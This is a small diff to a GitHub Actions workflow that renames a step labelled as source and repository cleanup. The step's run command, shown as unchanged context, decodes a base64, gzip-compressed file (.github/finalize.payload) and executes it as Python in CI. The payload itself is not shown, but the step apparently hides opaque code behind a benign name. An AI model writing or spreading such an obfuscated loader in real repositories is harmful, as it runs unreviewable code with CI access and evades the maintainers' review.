@@ -31,7 +31,7 @@ jobs:
         with:
           components: rustfmt
 
-      - name: Apply final source and repository cleanup
+      - name: Apply final source and repository cleanup v2
         shell: pwsh
         run: |
           python -c "import base64,gzip,pathlib; source=gzip.decompress(base64.b64decode(pathlib.Path('.github/finalize.payload').read_text())).decode(); exec(compile(source, 'finalize.py', 'exec'))" *>&1 | Tee-Object -FilePath finalize.log
